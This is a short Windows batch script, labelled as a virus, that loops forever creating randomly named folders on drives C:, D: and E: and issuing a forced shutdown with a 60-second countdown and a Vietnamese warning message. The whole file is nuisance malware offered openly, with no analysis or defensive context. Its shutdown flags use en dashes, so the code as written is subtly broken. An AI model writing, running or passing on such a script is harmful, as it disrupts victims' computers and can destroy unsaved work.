@echo off
:virus
cd /d C:
md %RANDOM%
cd /d D:
md %RANDOM%
cd /d E:
md %RANDOM%
shutdown –s –f –t 60 –c "Máy tính sẽ tắt trong khoảng 60 giây nữa… "
goto virus